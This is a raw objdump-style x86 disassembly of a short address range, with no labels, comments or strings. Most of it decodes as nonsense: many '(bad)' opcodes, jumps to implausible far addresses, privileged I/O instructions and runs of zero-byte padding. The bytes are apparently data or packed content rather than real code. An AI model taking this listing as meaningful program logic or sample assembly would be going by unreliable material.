  438006:	fisub  WORD PTR ds:[edx+0x3e]
  43800a:	or     DWORD PTR [edi+0x6e4cd24],eax
  438010:	pop    ecx
  438011:	(bad)  
  438012:	adc    eax,DWORD PTR [eax]
  438014:	jmp    0x6357521a
  438019:	imul   BYTE PTR [ecx+0x7a76e912]
  43801f:	add    al,0xf8
  438021:	jmp    0x2f2c63ea
  438026:	adc    eax,0x8862d185
  43802b:	nop
  43802c:	nop
  43802d:	pop    esp
  43802e:	add    al,BYTE PTR [eax]
  438030:	jb     0x438032
  438032:	add    BYTE PTR [eax],al
  438034:	add    BYTE PTR [eax],al
  438036:	or     DWORD PTR cs:[eax-0x6f787a2b],ecx
  43803d:	jne    0x437fcb
  43803f:	add    al,BYTE PTR [eax]
  438041:	(bad)
  438046:	and    BYTE PTR [ecx-0x1bbf2cf0],0xcc
  43804d:	push   es
  43804e:	icebp  
  43804f:	scas   eax,DWORD PTR es:[edi]
  438050:	in     eax,dx
  438051:	pusha  
  438052:	out    0xad,al
  438054:	adc    ch,cl
  438056:	jbe    0x43803c
  438058:	xchg   BYTE PTR [ecx-0x12],al
  43805b:	adc    eax,DWORD PTR [eax]
  43805d:	jmp    0xe942a981
  438062:	jbe    0x438048
  438064:	int3   
  438065:	retf   
  438066:	xchg   ebx,eax
  438067:	pop    es
  438068:	nop
  438069:	mov    eax,ds:0x6a00026b
  43806e:	xor    BYTE PTR [edi-0x18],ch
  438071:	clc    
  438072:	jns    0x438076
  438074:	add    BYTE PTR [eax],al
  438076:	xor    DWORD PTR [edi+0x466c688],0x0
  43807d:	sub    esp,DWORD PTR ds:0xd7f8457e
  438083:	jle    0x438041
  438085:	push   ss
  438086:	dec    esp
  438087:	add    al,0x33
  438089:	iret   
  43808a:	jb     0x4380f3
  43808c:	or     BYTE PTR [edi+0x1bacc],dh
  438092:	dec    esp
  438093:	jg     0x4380e2
  438095:	in     al,dx
  438096:	push   0xffffffd3
  438098:	(bad)  [ebx+0x0]
  43809e:	add    BYTE PTR [esi+edi*8-0x80],ah
  4380a2:	inc    ebp
  4380a3:	clc    
  4380a4:	push   0x18649002
  4380a9:	add    BYTE PTR [eax],al
  4380ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4380ac:	push   esi
  4380ad:	or     eax,0xeae9c8a
  4380b2:	add    BYTE PTR [esp+edi*2],bl
  4380b5:	add    al,0x11
  4380b7:	xchg   edi,eax
  4380b8:	cmp    ebp,ebx
  4380ba:	add    esp,edx
  4380bc:	pop    ss
  4380bd:	cmp    DWORD PTR [eax-0x38],0x7c
  4380c1:	dec    eax
  4380c2:	or     BYTE PTR [esi-0x6a],dl
  4380c5:	mov    cl,0x16
  4380c7:	int3   
  4380c8:	add    ecx,DWORD PTR [eax-0x6f831cec]
  4380ce:	mov    esp,0x8b0003ca
  4380d3:	loope  0x4380b4
  4380d5:	clc    
  4380d6:	push   edi
  4380d7:	enter  0x10b6,0x2a
  4380db:	xchg   BYTE PTR [eax-0x34],ch
  4380de:	out    dx,eax
  4380df:	daa    
  4380e0:	push   ecx
  4380e1:	icebp  
  4380e2:	lea    ecx,[eax]
  4380e4:	cli    
  4380e5:	out    dx,eax
  4380e6:	mov    DWORD PTR [edx+eax*2],edi
  4380e9:	push   cs
  4380ea:	add    BYTE PTR [esp+edi*2+0x7d3afc4d],cl
  4380f1:	mov    eax,0xfd6f75b8
  4380f6:	dec    DWORD PTR [esi-0x427b1e07]
  4380fc:	popf   
  4380fd:	pop    es
  4380fe:	add    BYTE PTR [ebp-0x39],dh
  438101:	dec    esp
  438102:	loope  0x438104
  438104:	add    BYTE PTR [eax],al
  438106:	add    BYTE PTR [eax],al
  438108:	(bad)  
  438109:	loopne 0x4380c3
  43810b:	adc    dh,BYTE PTR [ebp+0x59]
  43810e:	jecxz  0x438116
  438110:	sbb    eax,0x750012e1
  438115:	pop    esp
  438116:	shl    bh,1
  438118:	cld    
  438119:	loopne 0x4380d3
  43811b:	adc    dh,BYTE PTR [ebp+0x59]
  43811e:	xchg   BYTE PTR [eax-0x2b107],cl
  438124:	neg    BYTE PTR [edx+0x622c7d78]
  43812a:	sti    
  43812b:	push   esi
  43812c:	in     al,dx
  43812d:	adc    eax,0xbb466270
  438132:	test   DWORD PTR [eax+0x7d],ecx
  438135:	repnz (bad) 
  438137:	jecxz  0x4380cc
  438139:	bound  ecx,QWORD PTR [ebp-0x2a69448]
  43813f:	test   BYTE PTR [ebp+0x2d80874d],ah
  438145:	push   edi
  438146:	std    
  438147:	(bad)  
  438148:	std    
  438149:	pop    esp
  43814a:	adc    al,0x85
  43814c:	cmp    ch,al
  43814e:	add    ebx,DWORD PTR [eax-0x7f]
  438151:	hlt    
  438152:	hlt    
  438153:	adc    edi,edi
  438155:	call   0x59b89415
  43815a:	xchg   BYTE PTR [eax+0x6d],cl
  43815d:	loope  0x43816f
  43815f:	or     esi,ebp
  438161:	enter  0x12b8,0x75
  438165:	pop    ecx
  438166:	xchg   BYTE PTR [ebx-0x67],bh
  438169:	pop    ecx
  43816a:	aad    0x13
  43816c:	add    BYTE PTR [eax],al
  43816e:	add    BYTE PTR [eax],al
  438170:	add    ah,ah
  438172:	dec    eax
  438173:	daa    
  438174:	(bad)  
  438175:	adc    eax,DWORD PTR [edx]
  438177:	mov    dh,0x6d
  438179:	adc    BYTE PTR [edx+edx*8-0x75],al
  43817d:	in     eax,0xad
  43817f:	stc    
  438180:	add    esi,DWORD PTR [ebp-0x18]
  438183:	pop    edi
  438184:	mov    esp,0x3e717bd
  438189:	pop    eax
  43818a:	adc    al,BYTE PTR [ecx+0x51]
  43818d:	dec    ebx
  43818e:	in     eax,0xdf
  438190:	xchg   ebx,eax
  438191:	sbb    eax,0xd803e715
  438196:	inc    ebx
  438197:	jmp    0x7503:0xf1aefd8a
  43819e:	jns    0x4381c4
  4381a0:	js     0x438132
  4381a2:	push   eax
  4381a3:	pusha  
  4381a4:	test   DWORD PTR [esi-0x78],0xab7cf7b0
  4381ab:	ins    DWORD PTR es:[edi],dx
  4381ac:	add    al,0x75
  4381ae:	add    ch,BYTE PTR [edx-0x18fdd539]
  4381b4:	add    esi,DWORD PTR [ebp+0x59]
  4381b7:	add    DWORD PTR [ecx],edi
  4381b9:	and    bh,al
  4381bb:	call   0xe745f97a
  4381c0:	add    esi,DWORD PTR [eax+ecx*8]
  4381c3:	dec    esi
  4381c4:	add    DWORD PTR [ebp+0x2],esi
  4381c7:	out    0x68,eax
  4381c9:	sub    DWORD PTR [ebx+0x27503e2],0x6eac72a
  4381d3:	out    0x3,eax
  4381d5:	add    BYTE PTR [eax],al
  4381d7:	add    BYTE PTR [eax],al
  4381d9:	add    BYTE PTR [ebp-0x7f],dh
  4381dc:	lods   al,BYTE PTR ds:[esi]
  4381dd:	jae    0x438258
  4381df:	sbb    edi,DWORD PTR [ebx+ebp*2+0x7a33877c]
  4381e6:	mov    esp,0x21ddaa6d
  4381eb:	jns    0x4381f9
  4381ed:	fcomip st,st(1)
  4381ef:	sub    edx,DWORD PTR ds:[eax-0x47]
  4381f3:	add    BYTE PTR ds:[ebp+ebp*8-0x4d9db0a2],bl
  4381fb:	add    eax,0x10d27785
  438200:	add    cl,ch
  438202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438203:	add    cl,bh
  438205:	xlat   BYTE PTR ds:[ebx]
  438206:	add    DWORD PTR [ebx+0x51],ebp
  438209:	xchg   edx,eax
  43820a:	ja     0x43820e
  43820c:	add    cl,ch
  43820e:	cmc    
  43820f:	je     0x438216
  438211:	aas    
  438212:	inc    ebx
  438213:	jecxz  0x438199
  438215:	cdq    
  438216:	pop    eax
  438217:	fisub  WORD PTR ds:[edx+0x28]
  43821b:	adc    DWORD PTR [edi+0x6dff52c],eax
  438221:	ja     0x438231
  438223:	adc    BYTE PTR [eax],al
  438225:	jmp    0x634b5217
  43822a:	lock test eax,0x7a76e912
  438230:	add    al,0xd8
  438232:	ja     0x4381fc
  438234:	adc    esp,DWORD PTR [ebx+0x8]
  438237:	mov    ch,0x12
  438239:	jmp    0xfdbe09b4
  43823e:	add    BYTE PTR [eax],al
  438240:	add    BYTE PTR [eax],al
  438242:	add    ch,bh
  438244:	mov    bh,0x7
  438246:	jb     0x43827b
  438248:	imul   ecx,DWORD PTR [eax-0x6d788e03],0x2608d
  438252:	call   0xd9f29327
  438257:	pushf  
  438258:	inc    esp
  438259:	bound  ebx,QWORD PTR [edx]
  43825b:	dec    esi
  43825c:	out    dx,eax
  43825d:	mov    ebp,0xbc8fef34
  438262:	push   DWORD PTR [esi+0x2]
  438265:	bound  esi,QWORD PTR [eax-0x10]
  438268:	test   eax,0x6776e912
  43826d:	or     eax,0x62622587
  438272:	add    BYTE PTR [ebp-0x63e9477a],ah
  438278:	add    BYTE PTR [ebx-0x3f],bh
  43827b:	xchg   ecx,eax
  43827c:	ja     0x438204
  43827e:	mov    esp,0x8b0000c2
  438283:	popa   
  438284:	cli    
  438285:	or     BYTE PTR [esi+0xfe8],0x54
  43828c:	test   ecx,esi
  43828e:	or     ebp,DWORD PTR [edx]
  438290:	push   eax
  438291:	pop    edi
  438292:	mov    ecx,DWORD PTR [ecx+eiz*2]
  438295:	int3   
  438296:	loop   0x43827f
  438298:	cmp    BYTE PTR ds:0x5dea9189,cl
  43829e:	or     edx,eax
  4382a0:	scas   al,BYTE PTR es:[edi]
  4382a1:	push   cs
  4382a2:	add    BYTE PTR [ebp+edi*2+0x4e],bl
  4382a6:	or     BYTE PTR [eax],al
  4382a8:	add    BYTE PTR [eax],al
  4382aa:	add    BYTE PTR [eax],al
  4382ac:	mov    BYTE PTR [eax+0x4c16b8],0x88
  4382b3:	add    al,0x3d
  4382b5:	pop    es
  4382b6:	push   esi
  4382b7:	adc    al,0xa6
  4382b9:	nop
  4382ba:	mov    cl,0x16
  4382bc:	sbb    al,0x0
  4382be:	cmp    DWORD PTR [esi+0x40],0x7d
  4382c2:	inc    esi
  4382c3:	or     BYTE PTR [edi+0x1088f541],dl
  4382c9:	stc    
  4382ca:	adc    BYTE PTR [esi+0x10e8],0xd
  4382d1:	dec    edx
  4382d2:	or     eax,0xc21dfcb1
  4382d7:	data16 (bad) 
  4382d9:	fidivr WORD PTR [edx-0x3e]
  4382dc:	mov    eax,ds:0xc2bc8e7d
  4382e1:	(bad)  
  4382e2:	jmp    DWORD PTR [ebp+0x55]
  4382e5:	cmp    BYTE PTR [eax-0x1d0023ea],0x13
  4382ec:	repnz aam 0xdf
  4382ef:	data16 jne 0x438354
  4382f2:	jg     0x4382ac
  4382f4:	arpl   WORD PTR [ecx-0x3],bx
  4382f7:	jl     0x4382ad
  4382f9:	pop    esi
  4382fa:	mov    WORD PTR [edx-0x2ac17],cs
  438300:	out    dx,al
  438301:	sahf   
  438302:	or     eax,0xe1deb85
  438307:	add    BYTE PTR [ebp-0x28],dh
  43830a:	cmp    al,0xfc
  43830c:	mul    BYTE PTR [edx+0x1]
  43830f:	jp     0x438311
  438311:	add    BYTE PTR [eax],al
  438313:	add    BYTE PTR [eax],al
  438315:	sub    edi,DWORD PTR [ebx-0x57ec2f78]
  43831b:	arpl   WORD PTR [ebp+0x438c4dc3],ax
  438321:	imul   eax,ebx,0x4b1d920a
  438327:	std    
  438328:	(bad)  
  438329:	out    dx,al
  43832a:	adc    cl,BYTE PTR [esi+eax*4]
  43832d:	sti    
  43832e:	loopne 0x43833e
  438330:	add    BYTE PTR [ebp-0xf],dh
  438333:	clc    
  438334:	push   cs
  438335:	je     0x43836a
  438337:	adc    BYTE PTR [esi+0xed1e3],al
  43833d:	jne    0x43832f
  43833f:	not    BYTE PTR [ebx]
  438341:	(bad)  
  438342:	sbb    cl,BYTE PTR [eax*4+0x1484f5b8]
  438349:	push   0xffffffe0
  43834b:	mov    ?,WORD PTR [ebx+ebp*2-0x570102a7]
  438352:	jne    0x438308
  438354:	adc    BYTE PTR [edi+0x1f],cl
  438357:	(bad)  
  438359:	or     eax,0xfcf442d8
  43835e:	retf   0x12b0
  438361:	jne    0x4383bc
  438363:	fild   WORD PTR [esi+0xef0fb]
  438369:	jne    0x43832b
  43836b:	adc    DWORD PTR [edx-0x5a],esp
  43836e:	add    DWORD PTR [edi],eax
  438370:	loope  0x4383e5
  438372:	test   BYTE PTR [edi+0x11],bl
  438375:	jne    0x438379
  438377:	inc    sp
  438379:	add    BYTE PTR [eax],al
  43837b:	add    BYTE PTR [eax],al
  43837d:	add    BYTE PTR [ecx+0x79],dh
  438380:	pop    ecx
  438381:	mov    bh,0x87
  438383:	add    ah,bh
  438385:	lods   al,BYTE PTR ss:[esi]
  438387:	sub    BYTE PTR [ebx+edx*1+0x6c],bh
  43838b:	jl     0x4383de
  43838d:	add    esi,DWORD PTR [ebp+0x2]
  438390:	pop    esi
  438391:	mov    ecx,edx
  438393:	adc    esp,edi
  438395:	add    ecx,DWORD PTR [eax]
  438397:	imul   ebp,esp,0x98fb14f9
  43839d:	xchg   ecx,eax
  43839e:	pop    ecx
  43839f:	mov    edi,0xb17c0426
  4383a4:	imul   edx,DWORD PTR [edx+0x3e6fcef],0xffffffd7
  4383ab:	jge    0x438344
  4383ad:	loop   0x4383d8
  4383af:	gs pop esi
  4383b1:	retf   0xe066
  4383b4:	out    dx,eax
  4383b5:	xchg   ecx,eax
  4383b6:	or     eax,0x6c03e711
  4383bb:	mov    al,0x71
  4383bd:	mov    esp,0x8ce70267
  4383c2:	(bad)  
  4383c3:	cli    
  4383c4:	outs   dx,BYTE PTR ds:[esi]
  4383c5:	sbb    BYTE PTR [edx+0x69],bh
  4383c8:	and    DWORD PTR [eax],edx
  4383ca:	ins    BYTE PTR es:[edi],dx
  4383cb:	mov    al,0x51
  4383cd:	mov    ebx,0x8ce70287
  4383d2:	mov    edi,0x72d26e0e
  4383d7:	jp     0x4383d4
  4383d9:	adc    bh,al
  4383db:	nop
  4383dc:	xchg   ebx,eax
  4383dd:	adc    dh,BYTE PTR [ebp+0x2]
  4383e0:	cwde   
  4383e1:	adc    al,0x0
  4383e3:	add    BYTE PTR [eax],al
  4383e5:	add    BYTE PTR [eax],al
  4383e7:	fwait
  4383e8:	cmp    al,0xc9
  4383ea:	push   esp
  4383eb:	(bad)  [ebp+0x27503e8]
  4383f1:	add    al,ch
  4383f3:	mov    esp,0x482b7d15
  4383f8:	in     al,0x86
  4383fa:	outs   dx,DWORD PTR ds:[esi]
  4383fb:	or     DWORD PTR ds:0x94efe900,edx
  438401:	mov    esp,0xe50276ff
  438406:	retf   
  438407:	jge    0x4383bd
  438409:	and    ebp,0x870029b1
  43840f:	icebp  
  438410:	mov    es,WORD PTR [edx+0x26877]
  438416:	xchg   DWORD PTR [ecx],ebp
  438418:	dec    eax
  438419:	(bad)  
  43841a:	lock in al,0xaa
  43841d:	adc    ch,cl
  43841f:	jbe    0x438408
  438421:	mov    esi,0xbc7cefea
  438426:	div    DWORD PTR [esi+0x2]
  438429:	std    
  43842a:	shr    DWORD PTR [ecx-0x511f013],0xc7
  438431:	clc    
  438432:	mov    dh,0xdd
  438434:	jg     0x438481
  438436:	loope  0x438477
  438438:	jl     0x4383cc
  43843a:	jge    0x4384b2
  43843c:	add    al,BYTE PTR [eax]
  43843e:	jb     0x4383f4
  438440:	pop    edx
  438441:	dec    ebx
  438442:	xchg   ecx,eax
  438443:	mov    ebp,0x7d1c856b
  438448:	ror    DWORD PTR [edx+0x5f],0x0
  43844f:	add    dh,bh
  438451:	add    BYTE PTR [eax],al
  438453:	jmp    0xb62bc849
  438458:	sahf   
  438459:	imul   edi,ecx,0xe
  43845c:	xor    BYTE PTR [esi-0x1d],bh
  43845f:	les    esi,FWORD PTR [ecx-0x45d233ca]
  438465:	ss int3 
  438467:	mov    esp,0x3d7d55e9
  43846c:	xchg   BYTE PTR [edi-0x2eeff7c],dh
  438472:	sub    cl,cl
  438474:	or     dl,BYTE PTR [edx+0x32]
  438477:	mov    ah,ch
  438479:	adc    al,BYTE PTR [eax]
  43847b:	add    BYTE PTR [ebx-0x23ff4d18],dh
  438481:	add    al,0xe3
  438483:	pop    es
  438484:	push   ecx
  438485:	dec    ecx
  438486:	sbb    eax,0xed405700
  43848b:	mov    ebp,DWORD PTR [ecx+ecx*4]
  43848e:	push   cs
  43848f:	add    BYTE PTR [ecx+edi*8+0x75e614ae],bl
  438496:	mov    al,0x98
  438498:	mov    edx,0x4a0f0004
  43849d:	sbb    DWORD PTR [ecx],ebp
  43849f:	inc    ecx
  4384a0:	add    eax,0x48bed3b
  4384a5:	stos   BYTE PTR es:[edi],al
  4384a6:	push   cs
  4384a7:	add    BYTE PTR [ebp+esi*2-0x2b2603b3],cl
  4384ae:	push   es
  4384af:	test   DWORD PTR [eax-0x1],ebx
  4384b2:	(bad)  
  4384b3:	inc    DWORD PTR [eax]
  4384b5:	add    BYTE PTR [eax],al
  4384b7:	add    BYTE PTR [eax],al
  4384b9:	push   ebx
  4384ba:	cdq    
  4384bb:	jl     0x438470
  4384bd:	dec    esi
  4384be:	stos   BYTE PTR es:[edi],al
  4384bf:	adc    BYTE PTR [eax],al
  4384c1:	pop    esp
  4384c2:	add    al,0x23
  4384c4:	xlat   BYTE PTR ds:[ebx]
  4384c5:	push   edi
  4384c6:	mov    edx,0x99535475
  4384cb:	xor    al,0xb3
  4384cd:	push   0x7b
  4384cf:	into   
  4384d0:	out    dx,ax
  4384d2:	in     al,0x82
  4384d4:	dec    eax
  4384d5:	and    al,0x46
  4384d7:	add    dl,BYTE PTR [eax-0x74c]
  4384dd:	adc    edx,DWORD PTR [esi+0x42ab898]
  4384e3:	add    BYTE PTR [ebx+0x1c87f7cc],cl
  4384e9:	std    
  4384ea:	lock aas 
  4384ec:	adc    al,0x75
  4384ee:	pusha  
  4384ef:	stos   DWORD PTR es:[edi],eax
  4384f0:	cwde   
  4384f1:	sub    al,0x70
  4384f3:	std    
  4384f4:	(bad)  
  4384f5:	(bad)  
  4384f6:	mov    cl,0x9
  4384f8:	test   DWORD PTR [ebp+0x71],eax
  4384fb:	test   DWORD PTR [esp+eax*4],ebx
  4384fe:	in     al,0x93
  438500:	mov    esp,0xf8fd596b
  438505:	xor    eax,0x6d5b8665
  43850a:	retf   0x2613
  43850d:	scas   eax,DWORD PTR es:[edi]
  43850e:	ja     0x43855e
  438510:	jmp    0xf213:0xf0378600
  438517:	mov    bl,0xb8
  438519:	mov    ebx,DWORD PTR [ecx-0x3]
  43851c:	in     al,0x0
  43851e:	add    BYTE PTR [eax],al
  438520:	add    BYTE PTR [eax],al
  438522:	test   DWORD PTR [edi-0x7a],esi
  438525:	adc    al,0xc6
  438527:	jg     0x438577
  438529:	ficom  WORD PTR [ebx]
  43852b:	jb     0x4384ba
  43852d:	mov    eax,0xfcfd596b
  438532:	stos   DWORD PTR es:[edi],eax
  438533:	loop   0x4384b9
  438535:	mov    esp,0x84fd598b
  43853a:	mov    eax,0x158836a5
  43853f:	dec    edi
  438540:	std    
  438541:	jmp    FWORD PTR [edx-0x25]
  438544:	vrsqrtps xmm3,XMMWORD PTR [eax+0x5b0eb102]
  43854c:	stc    
  43854d:	inc    DWORD PTR [edx-0xc]
  438550:	test   BYTE PTR [ebx+eiz*2-0x7a4a02a7],bh
  438557:	pop    ecx
  438558:	std    
  438559:	call   FWORD PTR [esi-0x78]
  43855c:	ss (bad) 
  43855e:	jb     0x438537
  438560:	cmp    eax,0x2591afe
  438565:	mov    cl,0xc6
  438567:	pop    eax
  438568:	stc    
  438569:	dec    DWORD PTR [edx]
  43856b:	add    cl,cl
  43856d:	mov    ah,BYTE PTR [edi]
  43856f:	loopne 0x4385a6
  438571:	popa   
  438572:	lock mov ecx,0x927bddde
  438578:	(bad)  
  438579:	or     eax,0xadf20275
  43857e:	std    
  43857f:	test   eax,0x7b7503d1
  438584:	xchg   edi,eax
  438585:	sldt   WORD PTR [eax]
  438588:	add    BYTE PTR [eax],al
  43858a:	add    ch,bh
  43858c:	add    eax,0xe3576d8
  438591:	repnz lods eax,DWORD PTR ds:[esi]
  438593:	(bad)  [eax+0x7b7503f1]
  438599:	lahf   
  43859a:	psubb  mm2,mm1
  43859d:	fimul  WORD PTR [ebx-0x6c91ee77]
  4385a3:	loope  0x4385b4
  4385a5:	out    0x3,eax
  4385a7:	pushf  
  4385a8:	rcr    edx,0xb4
  4385ab:	gs sbb al,0x1d
  4385ae:	fnstsw WORD PTR [ecx+0x48c87457]
  4385b4:	jb     0x4385f0
  4385b6:	mov    ebp,ebp
  4385b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4385b9:	stc    
  4385ba:	add    esi,DWORD PTR [ebp-0x24]
  4385bd:	pop    edi
  4385be:	mov    ah,0x2d
  4385c0:	or     eax,0xc9bf03e7
  4385c5:	ins    DWORD PTR es:[edi],dx
  4385c6:	pop    edi
  4385c7:	mov    esi,0xfade241
  4385cc:	jae    0x4385eb
  4385ce:	les    ecx,FWORD PTR [edx-0xb]
  4385d1:	pop    ecx
  4385d2:	nop
  4385d3:	or     ch,bh
  4385d5:	loop   0x4385da
  4385d7:	jne    0x438582
  4385d9:	test   DWORD PTR [ebx],0x59be0275
  4385df:	repnz iret 
  4385e1:	jle    0x43856c
  4385e3:	(bad)  
  4385e4:	cli    
  4385e5:	mov    ebp,0xffe39f48
  4385ea:	in     eax,0xe1
  4385ec:	mov    ?,WORD PTR [esi+0xe5]
  4385f2:	add    BYTE PTR [eax],al
  4385f4:	or     ah,BYTE PTR [esi-0x7]
  4385f7:	jo     0x43862b
  4385f9:	push   esi
  4385fa:	bound  edi,QWORD PTR [edx]
  4385fc:	xchg   edi,eax
  4385fd:	jg     0x438647
  4385ff:	loope  0x4385d1
  438601:	cld    
  438602:	(bad)  
  438603:	xchg   ecx,eax
  438604:	jnp    0x438608
  438606:	add    dh,dh
  438608:	adc    BYTE PTR [ebx+0x276d7b8],cl
  43860e:	test   DWORD PTR [ecx-0x27e3857e],ebx
  438614:	inc    ecx
  438615:	ret    0xf613
  438618:	adc    BYTE PTR [ebx+0x276f7b7],cl
  43861e:	test   DWORD PTR [ecx-0x1eaf807e],esp
  438624:	inc    BYTE PTR [esi]
  438626:	(bad)  
  438628:	or     DWORD PTR [edi+0x7f76e912],esp
  43862e:	pop    ebx
  43862f:	stc    
  438630:	or     edx,eax
  438632:	adc    edi,DWORD PTR [eax]
  438634:	popa   
  438635:	sbb    al,0xc6
  438637:	dec    edi
  438638:	and    al,0x5f
  43863a:	test   DWORD PTR [ecx+edi*8],ebp
  43863d:	js     0x438693
  43863f:	jecxz  0x438627
  438641:	jge    0x4385d3
  438643:	lea    edi,[eax+0x2]
  438646:	add    BYTE PTR [edi-0x12],cl
  438649:	mov    DWORD PTR [eax-0x1afd8929],edi
  43864f:	shl    BYTE PTR [eax],cl
  438651:	jle    0x4385e7
  438653:	jae    0x43869f
  438655:	add    DWORD PTR [eax],eax
  438657:	jmp    0x43865c
  43865c:	add    BYTE PTR [eax],ah
  43865e:	fiadd  WORD PTR ss:[edi]
  438661:	outs   dx,BYTE PTR ds:[esi]
  438662:	xchg   edx,eax
  438663:	mov    eax,0xfd0276ff
  438668:	sbb    ebp,DWORD PTR [ecx-0x47ff7783]
  43866e:	idiv   edi
  438670:	jmp    DWORD PTR [edi+0x5ea8b50d]
  438676:	ds stc 
  438678:	mov    ah,BYTE PTR [ecx-0x16]
  43867b:	sbb    BYTE PTR [ebp-0x64],0xe4
  43867f:	shl    BYTE PTR [esi+edx*1+0x1a],cl
  438683:	xor    al,0xbd
  438685:	dec    esp
  438686:	cmp    bh,BYTE PTR [ecx]
  438688:	add    BYTE PTR [edi+0x79],dl
  43868b:	mov    esp,0xb700cc16
  438690:	adc    ah,cl
  438692:	add    BYTE PTR [eax],al
  438694:	sub    eax,DWORD PTR [edi-0x138138d6]
  43869a:	inc    esi
  43869b:	test   dh,bh
  43869d:	repnz rcr esi,1
  4386a0:	mov    eax,DWORD PTR [ecx+edi*8]
  4386a3:	pop    ebp
  4386a4:	or     DWORD PTR [ecx+ebp*4+0xe],eax
  4386a8:	add    BYTE PTR [ebp+edi*8-0x8cb6753],bl
  4386af:	(bad)  
  4386b0:	jmp    DWORD PTR [edi]
  4386b2:	imul   ecx,DWORD PTR ds:0xf727a888,0xadfda040
  4386bc:	cwde   
  4386bd:	aad    0x7
  4386bf:	add    BYTE PTR [eax],al
  4386c1:	add    BYTE PTR [eax],al
  4386c3:	add    BYTE PTR [eax],al
  4386c5:	add    BYTE PTR [edi],al
  4386c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4386c8:	add    DWORD PTR [ebx+0x1c880ac4],ecx
  4386ce:	dec    ebx
  4386cf:	in     eax,0x97
  4386d1:	mov    esp,0xff000042
  4386d6:	mov    WORD PTR [edx],cs
  4386d8:	test   eax,0x5e237610
  4386dd:	ror    DWORD PTR [edx],cl
  4386df:	in     al,0x44
  4386e1:	lock leave 
  4386e3:	inc    edx
  4386e4:	add    al,0xf0
  4386e6:	jb     0x4386cd
  4386e8:	scas   eax,DWORD PTR es:[edi]
  4386e9:	mov    eax,0xfffd6375
  4386ee:	push   ds
  4386ef:	inc    esi
  4386f0:	out    0xcc,eax
  4386f2:	sbb    esi,esp
  4386f4:	cli    
  4386f5:	scas   eax,DWORD PTR es:[edi]
  4386f6:	fisttp QWORD PTR [ebx-0x3]
  4386f9:	push   DWORD PTR [esi-0x60]
  4386fc:	jnp    0x438686
  4386fe:	leave  
  4386ff:	dec    ebx
  438700:	std    
  438701:	jmp    FWORD PTR [edi-0xb04290e]
  438707:	fild   WORD PTR [ebx]
  438709:	push   edx
  43870b:	pop    ecx
  43870c:	repnz push es
  43870e:	jp     0x43869b
  438710:	mov    dl,0xf0
  438712:	sub    eax,0x69e4fd99
  438717:	lock cmp DWORD PTR [edi-0x4e01ab24],edi
  43871e:	add    al,0x2a
  438720:	mov    ebx,0xbef0753f
  438725:	or     ebp,DWORD PTR [edx-0x34]
  438728:	out    dx,eax
  438729:	scas   al,BYTE PTR es:[edi]
  43872a:	add    BYTE PTR [eax],al
  43872c:	add    BYTE PTR [eax],al
  43872e:	add    BYTE PTR [edi-0x20],dh
  438731:	jnp    0x4386ef
  438733:	sbb    DWORD PTR [ecx-0x3],0xffffffb4
  438737:	test   DWORD PTR [ecx-0x3],ebx
  43873a:	dec    DWORD PTR [esi+0x4]
  43873d:	jnp    0x4387ba
  43873f:	test   DWORD PTR [eax-0x1fea85c6],esi
  438745:	(bad)  
  438746:	or     esi,DWORD PTR [edx-0x7c]
  438749:	sub    DWORD PTR [esi+0x6255f013],ebp
  43874f:	inc    esi
  438750:	aaa    
  438751:	jp     0x43879b
  438753:	jge    0x438710
  438755:	cli    
  438756:	(bad)  
  438757:	sbb    eax,0x6afffd43
  43875c:	jmp    0x4386e2
  43875e:	mov    eax,0x84fd596b
  438763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438764:	dec    ebp
  438765:	jne    0x438783
  438767:	add    ah,BYTE PTR fs:[edx+0x2f7766c3]
  43876e:	sbb    BYTE PTR [esp+ebp*4+0x6f],bh
  438772:	lods   al,BYTE PTR ds:[esi]
  438773:	xchg   DWORD PTR [edx],eax
  438775:	out    0x7e,eax
  438777:	(bad)  
  43877a:	punpckhdq mm6,QWORD PTR [edi+0x57]
  43877e:	scas   eax,DWORD PTR es:[edi]
  43877f:	addr16 add ah,bh
  438782:	jb     0x438739
  438784:	push   cs
  438785:	cmp    BYTE PTR [ebx],dl
  438787:	pop    ebx
  438788:	cmp    cl,cl
  43878a:	push   esi
  43878b:	or     al,0x77
  43878d:	lods   al,BYTE PTR ds:[esi]
  43878e:	jae    0x43878e
  438790:	int    0xdc
  438792:	jae    0x438794
  438794:	add    BYTE PTR [eax],al
  438796:	add    BYTE PTR [eax],al
  438798:	repnz xchg ecx,eax
  43879a:	mov    ebx,DWORD PTR [ecx]
  43879c:	jne    0x4387a0
  43879e:	outs   dx,BYTE PTR ds:[esi]
  43879f:	fcomp  st(6)
  4387a1:	fld    TBYTE PTR [edi-0x55]
  4387a4:	or     eax,0xd003e70c
  4387a9:	or     BYTE PTR [esi-0x30],bl
  4387ac:	outs   dx,BYTE PTR ds:[esi]
  4387ad:	fsubr  QWORD PTR [ebp+0xf]
  4387b0:	or     ah,bl
  4387b2:	xor    eax,0x6ef91766
  4387b7:	stos   DWORD PTR es:[edi],eax
  4387b8:	xchg   DWORD PTR [edx],eax
  4387ba:	out    0x6,eax
  4387bc:	lods   al,BYTE PTR ds:[esi]
  4387bd:	js     0x43882e
  4387bf:	scas   eax,DWORD PTR es:[edi]
  4387c0:	xchg   DWORD PTR [edx],eax
  4387c2:	out    0x7e,eax
  4387c4:	push   ecx
  4387c5:	lods   eax,DWORD PTR ds:[esi]
  4387c6:	mov    bh,0xc6
  4387c8:	dec    edx
  4387c9:	add    bl,BYTE PTR [esi-0x30]
  4387cc:	jp     0x43884b
  4387ce:	loop   0x4387d1
  4387d0:	icebp  
  4387d1:	jp     0x4387af
  4387d3:	jno    0x438841
  4387d5:	cs sti 
  4387d7:	mov    dh,0xdd
  4387d9:	into   
  4387da:	es add al,0xf8
  4387dd:	mov    al,BYTE PTR [ebx+0x7902751a]
  4387e3:	adc    al,0x75
  4387e5:	add    al,BYTE PTR [eax]
  4387e7:	jmp    0x9f78db55
  4387ec:	je     0x43877a
  4387ee:	push   edi
  4387ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4387f0:	les    ebx,FWORD PTR [ebx+0x62]
  4387f3:	jb     0x4387a0
  4387f5:	in     al,0xcc
  4387f7:	(bad)
  4387fb:	pop    es
  4387fc:	add    BYTE PTR [eax],al
  4387fe:	add    BYTE PTR [eax],al
  438800:	add    BYTE PTR [esi],bl
